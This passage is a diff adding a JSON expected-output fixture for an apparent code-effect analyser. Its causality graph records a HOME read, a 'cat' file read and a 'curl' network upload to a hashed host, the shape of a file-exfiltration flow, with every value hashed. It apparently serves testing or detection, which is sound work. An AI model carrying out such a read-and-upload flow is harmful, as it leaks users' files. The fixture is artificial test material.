@@ -1,0 +1,3259 @@
+{
+  "expected": {
+    "analysis": {
+      "engine_version": "0.1.0",
+      "limits": {
+        "max_analysis_bytes": 33554432,
+        "max_analysis_steps": 32768,
+        "max_boundaries": 4096,
+        "max_causal_depth": 256,
+        "max_causal_edges": 32768,
+        "max_causal_nodes": 16384,
+        "max_causal_pairs": 32768,
+        "max_effects": 4096,
+        "max_execution_depth": 8,
+        "max_execution_fanout": 256,
+        "max_execution_nodes": 4096,
+        "max_go_nodes": 20000,
+        "max_heredoc_expansions": 4096,
+        "max_java_nodes": 30000,
+        "max_js_nodes": 20000,
+        "max_patch_bytes": 4194304,
+        "max_patch_files": 2048,
+        "max_php_nodes": 20000,
+        "max_provenance_nodes": 65536,
+        "max_python_nodes": 80000,
+        "max_resolved_source_files": 64,
+        "max_ruby_nodes": 20000,
+        "max_rust_nodes": 20000,
+        "max_shell_function_depth": 8,
+        "max_shell_words": 4096,
+        "max_source_bytes": 4194304,
+        "max_value_cardinality": 64,
+        "max_value_depth": 24
+      },
+      "model_set": "builtin:blake3:412be1ea11cd035818957cfd02473da220c52267e7d6cd33761a51369229c197"
+    },
+    "causality": {
+      "coverage": {
+        "level": "full"
+      },
+      "graph": {
+        "edges": [
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:026d0c178343bc20171a64918bdca59deac65517433d936e56200a8f52c0992e",
+            "modality": "may",
+            "order": 0,
+            "provenance": [
+              2
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:0279e9226ba910615718600c436e3bf62619b830454a68dcf443d37529847f85"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:026d0c178343bc20171a64918bdca59deac65517433d936e56200a8f52c0992e",
+            "modality": "may",
+            "order": 1,
+            "provenance": [
+              2
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:c6ad949414d9e25c26fd88553c7d9f61562b9513500b4b6c0ad33cc020ed8ace"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:0279e9226ba910615718600c436e3bf62619b830454a68dcf443d37529847f85",
+            "modality": "may",
+            "order": 2,
+            "provenance": [
+              2
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:11b1464a6b819364cb756128959351b4ab3af6ef1166c23c9946434ad5519b5c"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:0459678f329f871aaa4edc20999b1d72833a3b42acbbfb0a37d219214403de84",
+            "modality": "may",
+            "order": 3,
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:026d0c178343bc20171a64918bdca59deac65517433d936e56200a8f52c0992e"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:11b1464a6b819364cb756128959351b4ab3af6ef1166c23c9946434ad5519b5c",
+            "modality": "may",
+            "order": 4,
+            "provenance": [
+              0,
+              2,
+              7
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:941e54fd3ff05f267ea2d87f7426de59318a6e606ae2654c463413edd360de39"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:2082fa20c61f9bbdb4845f44d0153ac8a6362ec1e355548ca64d8f76a28a1a6a",
+            "modality": "may",
+            "order": 5,
+            "provenance": [
+              9,
+              10,
+              11,
+              12
+            ],
+            "reason": "control_dependency",
+            "to": "occurrence:blake3:6a16a142d7e2df7e4c553b404b66f67f34aad502d3d68e5a7b749ec9e40c9d81"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:2082fa20c61f9bbdb4845f44d0153ac8a6362ec1e355548ca64d8f76a28a1a6a",
+            "modality": "may",
+            "order": 6,
+            "provenance": [
+              12,
+              13
+            ],
+            "reason": "control_dependency",
+            "to": "occurrence:blake3:cc7c787b853f310851b0fe1878b3e549066c739ef9e38e54fc2fc81527da26e6"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:23322457e6c2a10d6b7ac2868e47c6046f26ee37e047994e2c9ce12f5b5cc8e0",
+            "modality": "must-on-success",
+            "order": 7,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:2082fa20c61f9bbdb4845f44d0153ac8a6362ec1e355548ca64d8f76a28a1a6a"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:23322457e6c2a10d6b7ac2868e47c6046f26ee37e047994e2c9ce12f5b5cc8e0",
+            "modality": "may",
+            "order": 8,
+            "provenance": [
+              12,
+              13
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:fe40e611b2e27e82c8ac6bf189c1d7fbd8061c9000649a03263c57a988e93439"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:26828f85a2271b01bd1e3c556a17277559d830df5a6dc75c02eb69fee57e2d3e",
+            "modality": "must-on-success",
+            "order": 9,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "containment",
+            "to": "occurrence:blake3:23322457e6c2a10d6b7ac2868e47c6046f26ee37e047994e2c9ce12f5b5cc8e0"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:4549aeed118dd86b5e5c842279aee4db3b6233ec83854ea43ed0cc6fab5699c0",
+            "modality": "must-on-success",
+            "order": 10,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:2082fa20c61f9bbdb4845f44d0153ac8a6362ec1e355548ca64d8f76a28a1a6a"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:4549aeed118dd86b5e5c842279aee4db3b6233ec83854ea43ed0cc6fab5699c0",
+            "modality": "may",
+            "order": 11,
+            "provenance": [
+              12,
+              13
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:fe40e611b2e27e82c8ac6bf189c1d7fbd8061c9000649a03263c57a988e93439"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:53ef1c67603219b85a7f0a460551c08cfeb86e9ef080e8ed3a287bcd05847fcf",
+            "modality": "must-on-success",
+            "order": 12,
+            "provenance": [
+              2,
+              0
+            ],
+            "reason": "containment",
+            "to": "occurrence:blake3:bd4f82fc2d6f5eacffc4cd0e5268f5c6039e795087cc64b55ce1333d11105999"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:888adf1f3f8f4e0fdb0b7ef2300496dbc32ab981242139d1f2e83d91d79053a0",
+            "modality": "may",
+            "order": 13,
+            "provenance": [
+              0,
+              2
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:ea0c1ba125cd735fe8b8a42baff37c86d4b2ec33d3091252e39a39cbb0bbac6a"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:8954c8c82fb00c711bd7e05dfa2b62e0522a3af2be43b48aaef342f2a3914743",
+            "modality": "must-on-success",
+            "order": 14,
+            "provenance": [
+              2,
+              0
+            ],
+            "reason": "containment",
+            "to": "occurrence:blake3:f96465b88d47f71f588a1fc0c3f38cf0e2815f036d0908b5d13dae8e5555149b"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:93ba8404624fd6f3ba59820b873f745d102b74dfee0447aa0651fafd22aab9d0",
+            "modality": "may",
+            "order": 15,
+            "provenance": [
+              1
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:0459678f329f871aaa4edc20999b1d72833a3b42acbbfb0a37d219214403de84"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:941e54fd3ff05f267ea2d87f7426de59318a6e606ae2654c463413edd360de39",
+            "modality": "may",
+            "order": 16,
+            "provenance": [
+              7
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:fe40e611b2e27e82c8ac6bf189c1d7fbd8061c9000649a03263c57a988e93439"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:a04cc44d6d743ea3ae733c4d9cc8aa679751770efe7b0d6fb2c600e29289e6af",
+            "modality": "must-on-success",
+            "order": 17,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:2082fa20c61f9bbdb4845f44d0153ac8a6362ec1e355548ca64d8f76a28a1a6a"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:a04cc44d6d743ea3ae733c4d9cc8aa679751770efe7b0d6fb2c600e29289e6af",
+            "modality": "may",
+            "order": 18,
+            "provenance": [
+              12,
+              13
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:fe40e611b2e27e82c8ac6bf189c1d7fbd8061c9000649a03263c57a988e93439"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:a38fdbb598f58484032acf5afa14e6c8ba2f543d03a60ca51e40c644da254ea3",
+            "modality": "must-on-success",
+            "order": 19,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "containment",
+            "to": "occurrence:blake3:4549aeed118dd86b5e5c842279aee4db3b6233ec83854ea43ed0cc6fab5699c0"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:aa8658768b3c447da4d7242136bf2bb16eba797bc9e909bbb59679f234967901",
+            "modality": "may",
+            "order": 20,
+            "provenance": [
+              0,
+              7
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:ea0c1ba125cd735fe8b8a42baff37c86d4b2ec33d3091252e39a39cbb0bbac6a"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:b1c859528f9acec8f23be74256f5294b9c86a0b2b271298dde4e9a36d51bc3b2",
+            "modality": "must-on-success",
+            "order": 21,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "containment",
+            "to": "occurrence:blake3:fe89a86a4b65f730b98bb2928c5024c9c6a39cd30a0cedc16be6543edd315269"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:b2275def0912e43e021285bbf6e5f109ecef7f107d0572e215b8629c48d54de1",
+            "modality": "may",
+            "order": 22,
+            "provenance": [
+              0,
+              7
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:f1a8fb21c48a98280b1fa3dcf7fb49993e5caa60c9015c6b4ddd204f22293304"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:b2ef00366e681ccfb11d76df1dbb6c931995e0c429f025647b87a36441fcb3ba",
+            "modality": "must-on-success",
+            "order": 23,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "containment",
+            "to": "occurrence:blake3:a04cc44d6d743ea3ae733c4d9cc8aa679751770efe7b0d6fb2c600e29289e6af"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:bd4f82fc2d6f5eacffc4cd0e5268f5c6039e795087cc64b55ce1333d11105999",
+            "modality": "must-on-success",
+            "order": 24,
+            "provenance": [
+              2,
+              0
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:da09f3e1fa276a333f4ae56e8c1128ed68bce41f09e888df897c49fd4ba62895"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:cc7c787b853f310851b0fe1878b3e549066c739ef9e38e54fc2fc81527da26e6",
+            "modality": "may",
+            "order": 25,
+            "provenance": [
+              7
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:b2275def0912e43e021285bbf6e5f109ecef7f107d0572e215b8629c48d54de1"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:da09f3e1fa276a333f4ae56e8c1128ed68bce41f09e888df897c49fd4ba62895",
+            "modality": "may",
+            "order": 26,
+            "provenance": [
+              5,
+              6
+            ],
+            "reason": "control_dependency",
+            "to": "occurrence:blake3:0279e9226ba910615718600c436e3bf62619b830454a68dcf443d37529847f85"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:da09f3e1fa276a333f4ae56e8c1128ed68bce41f09e888df897c49fd4ba62895",
+            "modality": "may",
+            "order": 27,
+            "provenance": [
+              4,
+              5
+            ],
+            "reason": "control_dependency",
+            "to": "occurrence:blake3:c6ad949414d9e25c26fd88553c7d9f61562b9513500b4b6c0ad33cc020ed8ace"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:dbb290978e167a890c848996522c89d40de395f09f52b9b0b00900806ca5082a",
+            "modality": "must-on-success",
+            "order": 28,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "launch",
+            "to": "occurrence:blake3:2082fa20c61f9bbdb4845f44d0153ac8a6362ec1e355548ca64d8f76a28a1a6a"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:dbb290978e167a890c848996522c89d40de395f09f52b9b0b00900806ca5082a",
+            "modality": "may",
+            "order": 29,
+            "provenance": [
+              1,
+              0
+            ],
+            "reason": "control_dependency",
+            "to": "occurrence:blake3:93ba8404624fd6f3ba59820b873f745d102b74dfee0447aa0651fafd22aab9d0"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:dbb290978e167a890c848996522c89d40de395f09f52b9b0b00900806ca5082a",
+            "modality": "must-on-success",
+            "order": 30,
+            "provenance": [
+              2,
+              0
+            ],
+            "reason": "launch",
+            "to": "occurrence:blake3:da09f3e1fa276a333f4ae56e8c1128ed68bce41f09e888df897c49fd4ba62895"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:f96465b88d47f71f588a1fc0c3f38cf0e2815f036d0908b5d13dae8e5555149b",
+            "modality": "must-on-success",
+            "order": 31,
+            "provenance": [
+              2,
+              0
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:da09f3e1fa276a333f4ae56e8c1128ed68bce41f09e888df897c49fd4ba62895"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:fe40e611b2e27e82c8ac6bf189c1d7fbd8061c9000649a03263c57a988e93439",
+            "modality": "may",
+            "order": 32,
+            "provenance": [
+              12,
+              13
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:cc7c787b853f310851b0fe1878b3e549066c739ef9e38e54fc2fc81527da26e6"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:fe89a86a4b65f730b98bb2928c5024c9c6a39cd30a0cedc16be6543edd315269",
+            "modality": "must-on-success",
+            "order": 33,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:2082fa20c61f9bbdb4845f44d0153ac8a6362ec1e355548ca64d8f76a28a1a6a"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:fe89a86a4b65f730b98bb2928c5024c9c6a39cd30a0cedc16be6543edd315269",
+            "modality": "may",
+            "order": 34,
+            "provenance": [
+              12,
+              13
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:fe40e611b2e27e82c8ac6bf189c1d7fbd8061c9000649a03263c57a988e93439"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:fef2a62cdc3cfc6ed49ad8f58ef990e6f9425c8656ed48fb2b6b9a338ceff36b",
+            "modality": "may",
+            "order": 35,
+            "provenance": [
+              0,
+              2
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:8f0b31224254b484dd0e18bcc06f06338114d67a50088fa313943adc515717cf"
+          }
+        ],
+        "nodes": [
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 0,
+            "id": "occurrence:blake3:dbb290978e167a890c848996522c89d40de395f09f52b9b0b00900806ca5082a",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 0,
+            "port": "code"
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:da09f3e1fa276a333f4ae56e8c1128ed68bce41f09e888df897c49fd4ba62895",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 1,
+            "port": "code",
+            "provenance": [
+              2,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:8954c8c82fb00c711bd7e05dfa2b62e0522a3af2be43b48aaef342f2a3914743",
+            "kind": "value",
+            "modality": "must-on-success",
+            "order": 2,
+            "provenance": [
+              2,
+              0
+            ],
+            "value": {
+              "digest": "blake3:e9adf7d75d017486",
+              "expr": "literal"
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:f96465b88d47f71f588a1fc0c3f38cf0e2815f036d0908b5d13dae8e5555149b",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 3,
+            "port": {
+              "arg": 0
+            },
+            "provenance": [
+              2,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:53ef1c67603219b85a7f0a460551c08cfeb86e9ef080e8ed3a287bcd05847fcf",
+            "kind": "value",
+            "modality": "must-on-success",
+            "order": 4,
+            "provenance": [
+              2,
+              0
+            ],
+            "value": {
+              "digest": "blake3:d2f1d86815dffb33",
+              "expr": "literal"
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:bd4f82fc2d6f5eacffc4cd0e5268f5c6039e795087cc64b55ce1333d11105999",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 5,
+            "port": {
+              "arg": 1
+            },
+            "provenance": [
+              2,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:2082fa20c61f9bbdb4845f44d0153ac8a6362ec1e355548ca64d8f76a28a1a6a",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 6,
+            "port": "code",
+            "provenance": [
+              7,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:b2ef00366e681ccfb11d76df1dbb6c931995e0c429f025647b87a36441fcb3ba",
+            "kind": "value",
+            "modality": "must-on-success",
+            "order": 7,
+            "provenance": [
+              7,
+              0
+            ],
+            "value": {
+              "digest": "blake3:2f3da98c40ec3da0",
+              "expr": "literal"
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:a04cc44d6d743ea3ae733c4d9cc8aa679751770efe7b0d6fb2c600e29289e6af",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 8,
+            "port": {
+              "arg": 0
+            },
+            "provenance": [
+              7,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:b1c859528f9acec8f23be74256f5294b9c86a0b2b271298dde4e9a36d51bc3b2",
+            "kind": "value",
+            "modality": "must-on-success",
+            "order": 9,
+            "provenance": [
+              7,
+              0
+            ],
+            "value": {
+              "digest": "blake3:cadfeb0ea99d7d4a",
+              "expr": "literal"
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:fe89a86a4b65f730b98bb2928c5024c9c6a39cd30a0cedc16be6543edd315269",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 10,
+            "port": {
+              "arg": 1
+            },
+            "provenance": [
+              7,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:26828f85a2271b01bd1e3c556a17277559d830df5a6dc75c02eb69fee57e2d3e",
+            "kind": "value",
+            "modality": "must-on-success",
+            "order": 11,
+            "provenance": [
+              7,
+              0
+            ],
+            "value": {
+              "digest": "blake3:2060a2aa45ef0ee7",
+              "expr": "literal"
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:23322457e6c2a10d6b7ac2868e47c6046f26ee37e047994e2c9ce12f5b5cc8e0",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 12,
+            "port": {
+              "arg": 2
+            },
+            "provenance": [
+              7,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:a38fdbb598f58484032acf5afa14e6c8ba2f543d03a60ca51e40c644da254ea3",
+            "kind": "value",
+            "modality": "must-on-success",
+            "order": 13,
+            "provenance": [
+              7,
+              0
+            ],
+            "value": {
+              "digest": "blake3:1784625b27fff424",
+              "expr": "literal"
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:4549aeed118dd86b5e5c842279aee4db3b6233ec83854ea43ed0cc6fab5699c0",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 14,
+            "port": {
+              "arg": 3
+            },
+            "provenance": [
+              7,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 0,
+            "id": "occurrence:blake3:fef2a62cdc3cfc6ed49ad8f58ef990e6f9425c8656ed48fb2b6b9a338ceff36b",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 15,
+            "port": "stdin"
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 0,
+            "id": "occurrence:blake3:f1a8fb21c48a98280b1fa3dcf7fb49993e5caa60c9015c6b4ddd204f22293304",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 16,
+            "port": "stdout"
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 0,
+            "id": "occurrence:blake3:ea0c1ba125cd735fe8b8a42baff37c86d4b2ec33d3091252e39a39cbb0bbac6a",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 17,
+            "port": "stderr"
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:8f0b31224254b484dd0e18bcc06f06338114d67a50088fa313943adc515717cf",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 18,
+            "port": "stdin",
+            "provenance": [
+              2,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:11b1464a6b819364cb756128959351b4ab3af6ef1166c23c9946434ad5519b5c",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 19,
+            "port": "stdout",
+            "provenance": [
+              2,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:888adf1f3f8f4e0fdb0b7ef2300496dbc32ab981242139d1f2e83d91d79053a0",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 20,
+            "port": "stderr",
+            "provenance": [
+              2,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:941e54fd3ff05f267ea2d87f7426de59318a6e606ae2654c463413edd360de39",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 21,
+            "port": "stdin",
+            "provenance": [
+              7,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:b2275def0912e43e021285bbf6e5f109ecef7f107d0572e215b8629c48d54de1",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 22,
+            "port": "stdout",
+            "provenance": [
+              7,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:aa8658768b3c447da4d7242136bf2bb16eba797bc9e909bbb59679f234967901",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 23,
+            "port": "stderr",
+            "provenance": [
+              7,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "execution": 0,
+            "id": "occurrence:blake3:93ba8404624fd6f3ba59820b873f745d102b74dfee0447aa0651fafd22aab9d0",
+            "kind": "resource_interaction",
+            "modality": "may",
+            "operation": "environment.read",
+            "order": 24,
+            "provenance": [
+              1,
+              0
+            ],
+            "resource": {
+              "expr": "concrete",
+              "identity": {
+                "family": "environment_variable",
+                "name": "HOME"
+              }
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:c6ad949414d9e25c26fd88553c7d9f61562b9513500b4b6c0ad33cc020ed8ace",
+            "kind": "resource_interaction",
+            "modality": "may",
+            "operation": "process.exec",
+            "order": 25,
+            "provenance": [
+              4,
+              5
+            ],
+            "resource": {
+              "expr": "concrete",
+              "identity": {
+                "argv": [
+                  {
+                    "digest": "blake3:d2f1d86815dffb33",
+                    "expr": "literal"
+                  }
+                ],
+                "cwd": {
+                  "expr": "concrete",
+                  "identity": {
+                    "digest": "blake3:51adc52efe5df1b6",
+                    "family": "fs_path"
+                  }
+                },
+                "executable": "cat",
+                "family": "process"
+              }
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:0279e9226ba910615718600c436e3bf62619b830454a68dcf443d37529847f85",
+            "kind": "resource_interaction",
+            "modality": "may",
+            "operation": "filesystem.read",
+            "order": 26,
+            "provenance": [
+              5,
+              6
+            ],
+            "resource": {
+              "expr": "concrete",
+              "identity": {
+                "digest": "blake3:d2f1d86815dffb33",
+                "family": "fs_path"
+              }
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:6a16a142d7e2df7e4c553b404b66f67f34aad502d3d68e5a7b749ec9e40c9d81",
+            "kind": "resource_interaction",
+            "modality": "may",
+            "operation": "process.exec",
+            "order": 27,
+            "provenance": [
+              9,
+              10,
+              11,
+              12
+            ],
+            "resource": {
+              "expr": "concrete",
+              "identity": {
+                "argv": [
+                  {
+                    "digest": "blake3:cadfeb0ea99d7d4a",
+                    "expr": "literal"
+                  },
+                  {
+                    "digest": "blake3:2060a2aa45ef0ee7",
+                    "expr": "literal"
+                  },
+                  {
+                    "digest": "blake3:1784625b27fff424",
+                    "expr": "literal"
+                  }
+                ],
+                "cwd": {
+                  "expr": "concrete",
+                  "identity": {
+                    "digest": "blake3:51adc52efe5df1b6",
+                    "family": "fs_path"
+                  }
+                },
+                "executable": "curl",
+                "family": "process"
+              }
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:cc7c787b853f310851b0fe1878b3e549066c739ef9e38e54fc2fc81527da26e6",
+            "kind": "resource_interaction",
+            "modality": "may",
+            "operation": "network.upload",
+            "order": 28,
+            "provenance": [
+              12,
+              13
+            ],
+            "resource": {
+              "expr": "concrete",
+              "identity": {
+                "family": "network_endpoint",
+                "host": "blake3:90828ef08675ccbd",
+                "path": "blake3:9784f6462ac022ad",
+                "scheme": "https"
+              }
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:fe40e611b2e27e82c8ac6bf189c1d7fbd8061c9000649a03263c57a988e93439",
+            "kind": "port",
+            "modality": "may",
+            "order": 29,
+            "port": "http_request_body",
+            "provenance": [
+              12,
+              13
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "execution": 0,
